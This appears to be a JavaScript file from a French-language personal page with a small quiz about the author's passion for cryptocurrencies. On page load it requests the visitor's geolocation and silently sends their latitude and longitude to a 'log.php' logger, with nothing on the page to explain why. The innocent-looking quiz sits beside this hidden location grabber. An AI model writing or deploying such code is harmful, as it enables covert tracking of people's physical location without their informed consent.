window.onload = function() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendPosition);
    } else {
        console.log("La géolocalisation n'est pas supportée par ce navigateur.");
    }
};

function sendPosition(position) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "log.php", true);
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr.send("latitude=" + position.coords.latitude + "&longitude=" + position.coords.longitude);
}
function checkAnswer(answer) {
    const resultText = document.getElementById('quiz-result');
    if (answer === 'crypto') {
        resultText.textContent = "Correct ! Ma passion principale est les crypto-monnaies.";
    } else {
        resultText.textContent = "Faux. Essayez encore !";
    }
}
